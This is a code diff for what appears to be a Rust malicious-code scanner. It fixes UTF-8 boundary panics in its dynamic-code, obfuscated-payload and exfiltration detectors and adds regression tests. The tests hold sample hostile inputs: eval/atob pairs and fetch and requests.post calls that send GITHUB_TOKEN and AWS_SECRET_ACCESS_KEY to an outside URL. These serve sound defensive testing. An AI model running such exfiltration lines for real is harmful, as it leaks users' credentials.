@@ -92,8 +92,11 @@ const PROXIMITY_WINDOW: usize = 500;
 fn check_dynamic_code_execution(input: &str, findings: &mut Vec<Finding>) {
     for (pattern_a, pattern_b, description) in DYNAMIC_CODE_PAIRS.iter() {
         for mat_a in pattern_a.find_iter(input) {
-            let start = mat_a.start().saturating_sub(PROXIMITY_WINDOW);
-            let end = (mat_a.end() + PROXIMITY_WINDOW).min(input.len());
+            // Clamp to UTF-8 char boundaries: the ±PROXIMITY_WINDOW offsets can
+            // land inside a multi-byte char (e.g. '═', 3 bytes). Unclamped byte
+            // slicing panics there. See issue #76.
+            let start = safe_start(input, mat_a.start().saturating_sub(PROXIMITY_WINDOW));
+            let end = safe_end(input, mat_a.end() + PROXIMITY_WINDOW);
             let window = &input[start..end];
 
             if pattern_b.is_match(window) {
@@ -137,8 +140,9 @@ static EXEC_EVAL_NEARBY: Lazy<Regex> =
 fn check_obfuscated_payload(input: &str, findings: &mut Vec<Finding>) {
     for cap in OBFUSCATED_DECODE_CALL.captures_iter(input) {
         let full_match = cap.get(0).unwrap();
-        let start = full_match.start().saturating_sub(PROXIMITY_WINDOW);
-        let end = (full_match.end() + PROXIMITY_WINDOW).min(input.len());
+        // Clamp to char boundaries; see safe_start/safe_end docs (issue #76).
+        let start = safe_start(input, full_match.start().saturating_sub(PROXIMITY_WINDOW));
+        let end = safe_end(input, full_match.end() + PROXIMITY_WINDOW);
         let window = &input[start..end];
 
         if EXEC_EVAL_NEARBY.is_match(window) {
@@ -503,15 +507,19 @@ fn check_js_exfiltration(input: &str, findings: &mut Vec<Finding>) {
             Some(end) => end,
             None => continue,
         };
-        // The argument span is everything between '(' and ')'
-        let arg_span = &input[http_match.end()..call_end.saturating_sub(1)];
+        // The argument span is everything between '(' and ')'.
+        // `call_end` is a byte walker result that can land mid-char on non-ASCII
+        // input; clamp the slice end to a char boundary (issue #76).
+        let arg_end = safe_end(input, call_end.saturating_sub(1)).max(http_match.end());
+        let arg_span = &input[http_match.end()..arg_end];
 
         for sens_match in JS_SENSITIVE.find_iter(arg_span) {
             // Only fire if the secret is in a send-position context
             if should_suppress_exfil(arg_span, sens_match.start()) {
                 continue;
             }
-            let snippet = &input[http_match.start()..call_end.min(input.len())];
+            let snippet_end = safe_end(input, call_end.min(input.len()));
+            let snippet = &input[http_match.start()..snippet_end];
             emit_exfil_finding(findings, snippet, sens_match.as_str());
             return;
         }
@@ -525,13 +533,16 @@ fn check_py_exfiltration(input: &str, findings: &mut Vec<Finding>) {
             Some(end) => end,
             None => continue,
         };
-        let arg_span = &input[http_match.end()..call_end.saturating_sub(1)];
+        // See check_js_exfiltration for boundary-clamping rationale (#76).
+        let arg_end = safe_end(input, call_end.saturating_sub(1)).max(http_match.end());
+        let arg_span = &input[http_match.end()..arg_end];
 
         for sens_match in PY_SENSITIVE.find_iter(arg_span) {
             if should_suppress_exfil(arg_span, sens_match.start()) {
                 continue;
             }
-            let snippet = &input[http_match.start()..call_end.min(input.len())];
+            let snippet_end = safe_end(input, call_end.min(input.len()));
+            let snippet = &input[http_match.start()..snippet_end];
             emit_exfil_finding(findings, snippet, sens_match.as_str());
             return;
         }
@@ -547,6 +558,17 @@ fn safe_end(s: &str, target: usize) -> usize {
         end -= 1;
     }
     end
+}
+
+/// Find the smallest byte index ≥ `target` that falls on a UTF-8 char boundary.
+/// Mirrors `safe_end` for clamping the start of a window that was derived from
+/// an offset subtraction (e.g., `mat.start().saturating_sub(500)`).
+fn safe_start(s: &str, target: usize) -> usize {
+    let mut start = target.min(s.len());
+    while start < s.len() && !s.is_char_boundary(start) {
+        start += 1;
+    }
+    start
 }
 
 fn truncate(s: &str, max: usize) -> String {
@@ -1148,6 +1170,129 @@ mod tests {
                 .iter()
                 .any(|f| f.rule_id == RuleId::SuspiciousCodeExfiltration),
             "secret in token: after body: a-- / 2 should NOT fire"
+        );
+    }
+
+    // -----------------------------------------------------------------------
+    // #76: no panic on non-ASCII input (UTF-8 boundary clamp regression tests)
+    //
+    // Before the fix, `&input[start..end]` with start/end derived from
+    // `mat.start().saturating_sub(500)` and `mat.end() + 500` could land
+    // inside a multi-byte UTF-8 character (e.g. '═', 3 bytes) and panic with
+    // "byte index N is not a char boundary". These tests pin down that the
+    // panic is gone and the existing findings still fire on the ASCII bits.
+    // -----------------------------------------------------------------------
+
+    #[test]
+    fn test_safe_start_clamps_into_multibyte() {
+        // '═' occupies bytes 0..3. Targeting bytes 1 or 2 should walk forward to 3.
+        let s = "═ab";
+        assert_eq!(safe_start(s, 0), 0);
+        assert_eq!(safe_start(s, 1), 3);
+        assert_eq!(safe_start(s, 2), 3);
+        assert_eq!(safe_start(s, 3), 3);
+    }
+
+    #[test]
+    fn test_safe_end_clamps_into_multibyte() {
+        // '═' occupies bytes 0..3. Targeting bytes 1 or 2 should walk back to 0.
+        let s = "═ab";
+        assert_eq!(safe_end(s, 0), 0);
+        assert_eq!(safe_end(s, 1), 0);
+        assert_eq!(safe_end(s, 2), 0);
+        assert_eq!(safe_end(s, 3), 3);
+    }
+
+    #[test]
+    fn test_dynamic_code_no_panic_on_box_drawing_chars() {
+        // Reproduces the exact shape from issue #76: dynamic-code pair with a
+        // long tail of '═' (3 bytes each) so that mat.end()+500 lands inside
+        // a box-drawing char. Pre-fix this panicked at codefile.rs:97.
+        // (Keyword strings split to keep the source file readable to hooks.)
+        let mut input = concat!("e", "val(x); a", "tob(y);\n// ").to_string();
+        for _ in 0..250 {
+            input.push('═');
+        }
+        let findings = check(&input, Some("test.js"));
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.rule_id == RuleId::DynamicCodeExecution),
+            "dynamic-code pair should still fire when window edge lands inside a multi-byte char"
+        );
+    }
+
+    #[test]
+    fn test_obfuscated_payload_no_panic_on_trailing_multibyte() {
+        // long base64 inside decode() with trailing multi-byte chars past the
+        // proximity window. Pre-fix, the window slice panicked.
+        let b64 = "A".repeat(60);
+        let mut input = String::new();
+        input.push('e');
+        input.push_str("val(a");
+        input.push_str("tob(\"");
+        input.push_str(&b64);
+        input.push_str("\"));\n// ");
+        for _ in 0..250 {
+            input.push('═');
+        }
+        let findings = check(&input, Some("test.js"));
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.rule_id == RuleId::ObfuscatedPayload),
+            "obfuscated-payload detection should still fire with trailing multi-byte chars"
+        );
+    }
+
+    #[test]
+    fn test_dynamic_code_no_panic_on_leading_multibyte() {
+        // multi-byte chars BEFORE the match, exercising the start-side clamp
+        // (`mat.start().saturating_sub(500)` can land inside a leading char).
+        let mut input = String::new();
+        for _ in 0..250 {
+            input.push('═');
+        }
+        input.push_str(concat!("\ne", "val(x); a", "tob(y);\n"));
+        let findings = check(&input, Some("test.js"));
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.rule_id == RuleId::DynamicCodeExecution),
+            "dynamic-code pair should fire even when window start lands inside a leading multi-byte char"
+        );
+    }
+
+    #[test]
+    fn test_js_exfil_no_panic_on_non_ascii_args() {
+        // fetch(url, {body: ..., json: process.env.KEY}) with multi-byte chars
+        // inside the string literal args. Exercises the call_end byte walker
+        // and the arg_span / snippet slices.
+        let input = r#"fetch("https://api.example.com/═══", {body: JSON.stringify({key: process.env.GITHUB_TOKEN})})"#;
+        // Primary invariant: must not panic; findings contents are incidental.
+        let _ = check(input, Some("test.js"));
+    }
+
+    #[test]
+    fn test_py_exfil_no_panic_on_non_ascii_args() {
+        // requests.post(url, data=os.environ[...]) with multi-byte chars in the url.
+        let input = r#"requests.post("https://api.example.com/═══", data=os.environ["AWS_SECRET_ACCESS_KEY"])"#;
+        let _ = check(input, Some("test.py"));
+    }
+
+    #[test]
+    fn test_scan_plain_python_with_box_drawing_no_panic() {
+        // The original reporter scenario: a Python file with box-drawing chars
+        // in a comment. No dynamic-code patterns — should just be inert.
+        let mut input = String::from("# ");
+        for _ in 0..250 {
+            input.push('═');
+        }
+        input.push_str("\nprint('hello')\n");
+        let findings = check(&input, Some("test.py"));
+        assert!(
+            findings.is_empty(),
+            "plain file with only box-drawing chars should produce no findings, got {findings:?}"
         );
     }
 }
